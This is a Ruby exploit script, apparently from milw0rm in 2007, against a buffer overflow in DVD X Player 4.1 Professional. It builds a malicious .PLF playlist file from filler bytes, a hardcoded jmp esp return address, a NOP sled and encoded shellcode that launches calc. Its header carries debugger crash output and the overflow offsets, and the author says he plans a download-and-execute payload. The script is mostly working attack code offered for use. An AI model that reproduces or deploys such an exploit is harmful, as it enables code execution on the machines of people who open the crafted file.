#!/usr/bin/env ruby
####################################################################################################
#0day DVD X Player 4.1 Professional .PLF file buffer over flow found by n00b and poc by n00b.
#First of all DVD x is prone to a buffer-overflow when playing an overly long file name inside
#A .plf file Which is  InterVideo WinDVD Play list File but also Dvd x uses this file as a play
#list file.Also the seh handlers got smashed so seh over-write is possible.Upon successful 
#Exploitation calc will open and if it don't make sure you have the right jmp esp%
#Tested on :win xp service pack 2 
#Vendors web site: http://www.dvd-x-player.com/
#Esp was pointing 277 byte's in to the buffer.
#And eip was over written 261 byte's in  to the buffer .So i made the 17 byte's up with nop's sled.
#I will be writing a c version as it will be nice to have download execute shell code as the program
#Doesn't shut down but runs in the back ground
####################################################################################################
#                                                      \\Debug info//
#(65c.98c): Access violation - code c0000005 (first chance)
#First chance exceptions are reported before any exception handling.
#This exception may be expected and handled.
#eax=00000001 ebx=77f6cf47 ecx=04450e60 edx=00000042 esi=04450348 edi=6405341c
#eip=41414141 esp=0012f4ac ebp=01adfe50 iopl=0         nv up ei pl nz na po nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
#41414141 ??              ???
#0:000> g
#(65c.98c): Access violation - code c0000005 (first chance)
#First chance exceptions are reported before any exception handling.
#This exception may be expected and handled.
#eax=00000000 ebx=00000000 ecx=41414141 edx=7c9037d8 esi=00000000 edi=00000000
#eip=41414141 esp=0012f0dc ebp=0012f0fc iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
#41414141 ??              ???
###################################################################################  
#Shouts:  - Str0ke - Marsu  - SM - Aelphaeis - vade79 - c0ntex ~ Kevin Finisterre
###################################################################################
#Credit goes to n00b for writing exploit and finding bug. !!! < Enjoy >.
###################################################################################   

Header1 = "\x63\x3A\x5c"  # C:\

bof =   'A'* 257    #Fill our bufer with sh!t.

shell = 
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"+ #351 bytes
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"+
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"+
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"+
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"+
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57"+
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"+
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58"+
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"+
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"+
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"+
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54"+
"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"+
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53"+
"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"+
"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"+
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"+
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43"+
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"+
"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49"+
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"+
"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a"


ret = "\x27\xB1\xFA\x77"  # 4bytes // Jmp esp% in shlwapi.dll

nop = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" # Ffs my nop sled 16byte's

bof2 ='B'* 388  # fill the rest of the file up with sh!t.

Header2 = "\x2E\x6D\x70\x33" #  .mp3


n00b = Header1 + bof + ret + nop + shell + bof2 + Header2  # Build the file.
 
File.open( "Exploit.plf","w") do |the_file|  # Open the file for writing  

the_file.puts (n00b)  # Place data from variable. 

the_file.close  # Close
 
end

# milw0rm.com [2007-06-02]
